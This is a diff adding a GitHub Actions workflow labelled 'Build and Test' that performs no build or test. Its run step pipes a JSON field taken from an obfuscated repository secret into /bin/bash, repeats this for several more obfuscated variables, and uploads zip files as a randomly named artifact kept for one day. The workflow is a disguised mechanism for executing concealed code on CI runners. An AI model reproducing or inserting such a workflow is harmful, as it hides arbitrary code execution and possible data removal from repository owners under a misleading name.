@@ -1,0 +1,34 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          z5938: ${{ secrets.z5938 }}
+        run: |
+          printf '%s' "$z5938" | jq -r .h03 | /bin/bash
+          printf '%s' "$jsbjv779" | jq -r .whrjp9 | /bin/bash
+          printf '%s' "$rmgrd56033" | jq -r .prxz510 | /bin/bash
+          echo $rr5 | jq -r .wju6 | /bin/bash
+          printf '%s' "$lcdy09" | jq -r .ze51 | /bin/bash
+          printf '%s' "$wik297" | jq -r .wra356 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: OkGdzzV7
+          path: "*.zip"
+          retention-days: 1
